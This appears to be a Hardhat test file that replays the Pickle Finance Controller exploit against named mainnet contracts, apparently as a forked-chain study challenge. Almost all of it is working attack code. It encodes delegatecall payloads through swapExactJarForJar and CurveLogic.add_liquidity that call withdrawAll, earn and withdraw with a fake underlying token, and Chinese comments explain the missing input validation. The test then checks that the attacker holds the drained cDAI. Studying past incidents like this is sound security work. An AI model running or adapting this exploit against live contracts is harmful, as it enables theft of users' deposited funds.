const { ethers } = require('hardhat');
const { expect } = require('chai');

const CONTROLLER = '0x6847259b2B3A4c17e7c43C54409810aF48bA5210';
const CURVE_LOGIC = '0x6186E99D9CFb05E1Fdf1b442178806E81da21dD8';
const STRATEGY_CMPD_DAI_V2 = '0xCd892a97951d46615484359355e3Ed88131f829D';

const DAI_ = '0x6B175474E89094C44Da98b954EedeAC495271d0F';
const CDAI = '0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643';
const PDAI = '0x6949Bb624E8e8A90F87cD2058139fcd77D2F3F87';

describe('[Challenge] Pickle', function () {
  let attackerContract;
  let DAI;
  let cDAI;
  let pDAI;
  let strategyCmpdDai;
  let curve;
  let fakeUnderlying;
  let fakeJar;
  let controller;

  before(async function () {
    const attackerFactory = await ethers.getContractFactory('Attacker');
    attackerContract = await attackerFactory.deploy();

    DAI = await ethers.getContractAt('ERC20', DAI_);
    cDAI = await ethers.getContractAt('ERC20', CDAI);
    pDAI = await ethers.getContractAt('Jar', PDAI);

    strategyCmpdDai = await ethers.getContractAt('StrategyCmpdDaiV2', STRATEGY_CMPD_DAI_V2);

    curve = await ethers.getContractAt('CurveLogic', CURVE_LOGIC);

    const fakeUnderlyingFactory = await ethers.getContractFactory('FakeUnderlying');
    fakeUnderlying = await fakeUnderlyingFactory.deploy(cDAI.address);

    // FakeJar 的 Underlying 是 cDAI
    const fakeJarFactory = await ethers.getContractFactory('FakeJar');
    fakeJar = await fakeJarFactory.deploy(cDAI.address);

    controller = await ethers.getContractAt('Controller', CONTROLLER);
  });

  it('Exploit', async function () {
    [attacker] = await ethers.getSigners();

    // const balanceOfUnderlying = await cDAI.balanceOfUnderlying(strategyCmpdDai.address);
    // console.log('balanceOfUnderlying', balanceOfUnderlying);
    const balance = await strategyCmpdDai.getSuppliedUnleveraged();
    console.log(`getSuppliedUnleveraged(): ${balance}`, balance);

    const balanceOfPool = await strategyCmpdDai.balanceOfPool();
    console.log(`balanceOfPool(): ${balanceOfPool}`, balanceOfPool);
    // const balance = await attackerContract.getSuppliedUnleveraged(strategyCmpdDai.address);
    // console.log(`getSuppliedUnleveraged(): ${balance}`, balance);
    // const balanceS = await strategyCmpdDai.getSupplied();
    // console.log(balanceS);
    // const balanceB = await strategyCmpdDai.getBorrowed();
    // console.log(balanceB);
    // const balanceD = await DAI.balanceOf(strategyCmpdDai.address);
    // console.log(balanceD);

    const earns = 5;

    const targets = [earns + 2]; // address
    const datas = [earns + 2]; // bytes
    // const targets = []; // address
    // const datas = []; // bytes

    // 利用 Controller.swapExactJarForJar() 呼叫 CURVE_LOGIC.add_liquidity()，內再呼叫 STRATEGY_CMPD_DAI_V2.withdrawAll()
    // STRATEGY_CMPD_DAI_V2.withdrawAll() ref: https://etherscan.io/address/0xCd892a97951d46615484359355e3Ed88131f829D#code#F67#L191
    const withdrawAllIntf = new ethers.utils.Interface(['function withdrawAll()']);
    const withdrawAllFunctionSelector = withdrawAllIntf.getSighash('withdrawAll()');
    targets[0] = curve.address;
    datas[0] = getFunctionSignature(STRATEGY_CMPD_DAI_V2, withdrawAllFunctionSelector, cDAI.address);

    const earnIntf = new ethers.utils.Interface(['function earn()']);
    const earnFunctionSelector = earnIntf.getSighash('earn()');
    for (let i = 0; i < earns; i++) {
      targets[i + 1] = curve.address;
      datas[i + 1] = getFunctionSignature(pDAI.address, earnFunctionSelector, cDAI.address);
    }

    const withdrawIntf = new ethers.utils.Interface(['function withdraw(address)']);
    const withdrawFunctionSelector = withdrawIntf.getSighash('withdraw(address)');
    targets[earns + 1] = curve.address;
    datas[earns + 1] = getFunctionSignature(STRATEGY_CMPD_DAI_V2, withdrawFunctionSelector, fakeUnderlying.address);

    console.log(
      'Before exploiting, Attacker cDAI Balance',
      await formatToken(await cDAI.balanceOf(attacker.address), cDAI)
    );

    console.log('Before exploiting, DAI balance on pDAI', await formatToken(await DAI.balanceOf(pDAI.address), DAI));

    // 從 Pickle Controller.swapExactJarForJar() 發動攻擊
    // swapExactJarForJar() 未驗證參數 _fromJar, _toJar 是否為官方的 Jar 合約地址，也未過濾參數 _targets, _data 的內容
    // 加上 swapExactJarForJar() 中的 _execute() 有呼叫 delegatecall()，導致攻擊者可以劫持 Controller 身份進行任意 Delegatecall 調用
    // swapExactJarForJar() ref: https://etherscan.io/address/0x6847259b2B3A4c17e7c43C54409810aF48bA5210#code#F26#L249
    // _execute() ref: https://etherscan.io/address/0x6847259b2B3A4c17e7c43C54409810aF48bA5210#code#F26#L336
    await controller.swapExactJarForJar(fakeJar.address, fakeJar.address, 0, 0, targets, datas);
  });

  after(async function () {
    // Attacker has taken all tokens from the pool
    console.log(
      'After exploiting, Attacker cDAI Balance',
      await formatToken(await cDAI.balanceOf(attacker.address), cDAI)
    );
    console.log('After exploiting, DAI balance on pDAI', await formatToken(await DAI.balanceOf(pDAI.address), DAI));
    expect(await cDAI.balanceOf(attacker.address)).to.greaterThan(0);
  });
});

function getFunctionSignature(calleeAddress, functionSelector, underlyingAddress) {
  // Curve.add_liquidity ref: https://etherscan.io/address/0x6186E99D9CFb05E1Fdf1b442178806E81da21dD8#code#F28#L27
  const ABI = [
    'function add_liquidity(address curve, bytes4 curveFunctionSig, uint256 curvePoolSize, uint256 curveUnderlyingIndex, address underlying)',
  ];
  const iAbi = new ethers.utils.Interface(ABI);
  const data = iAbi.encodeFunctionData('add_liquidity', [calleeAddress, functionSelector, 1, 0, underlyingAddress]);
  return data;
}

async function formatToken(amount, token) {
  const tokenSymbol = await token.symbol();
  const decimals = await token.decimals();
  return `${ethers.utils.formatUnits(amount, decimals)} ${tokenSymbol}`;
}
